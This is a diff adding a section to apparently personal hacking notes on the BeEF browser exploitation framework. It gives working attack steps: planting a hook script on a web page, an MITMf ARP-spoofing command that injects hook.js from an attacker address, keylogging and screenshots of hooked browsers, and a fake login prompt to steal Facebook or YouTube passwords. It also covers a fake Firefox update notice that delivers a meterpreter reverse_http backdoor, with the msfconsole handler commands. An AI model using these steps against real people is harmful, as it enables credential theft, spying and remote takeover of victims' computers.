@@ -493,18 +493,79 @@ Using Maltego, you can find people close to your target.
 
 * search for https://anonymousemail.me
 
+## Beef Framework
 
+Browser exploitation framework.
 
+Click the Beef icon in Kali.
+Username `beef`
+Password `beef`
 
+How to hook browsers: when the target runs a command
+(via dns spoof, or social engineering)
 
+```
+go to /var/www/html
+modify index.html
+copy and paste the code from beef (next to Example:)
+chance the ip address to the ip address of the target.
+Every target that connects to that browser, will be hooked to beef.
+start the webserver: `service apache2 start`
+Use DNS Spoofing or social engineering to let your target browe your website.
+```
 
+### Beef - Hooking targets using MITMF
+copy the code from beef (next to Example:)
+`root@kali:~# mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --inject --js-url http://10.20.14.207:3000/hook.js`
 
+http://10.20.14.207:3000/hook.js is the url where the hook is stored.
 
+When they browse any website, they are hooked.
+(You can see it in the source code of the website that the code is injected.)
 
+### Running basic commands on the target computer
+In the 'commands' tab, 
+```
+Search for `raw javascript`
+Here you can implement any javascriptcode you want, E.g. Keylogger!
+```
+```
+Search for 'Spider Eye'
+This command takes a screenshot of the targets computer.
+```
+```
+Search for 'Redirect Browser'
+This command redirects the target to any page you want,
+you also can let the target download an update.
+```
 
+### Beef - Steal usernames and passwords using a fake login prompt
+### --- !!! ---
+```
+Search for 'Pretty theft'
+Choose the account you want to hijack. (Facebook, youtube,...)
+```
 
-
-
+### Beef - Gaining full control over the target pc
+### --- !!! ---
+```
+Search for 'Fake notification bar'
+Choose the correct webbrowser
+This will give the target a notification that there is an update needed to install
+use an own created backdoor (reverse http to get meterpreter access)
+upload to your own webserver
+Plugin URL is `http://10.20.14.207/update.exe`
+ip address is own webservers ip address and update.exe is the exploit (backdoor)
+Notification: 'Critical update for Firefox, click here to install'
+Before running this command, you need to be listening on the port your backdoor tries to connect with.
+> msfconsole
+> use exploit/multi/handler
+> show options
+> set PAYLOAD windows/meterpreter/reverse_http
+LHOST eigen ip
+LPORT 8080
+> exploit
+```
 
 
 
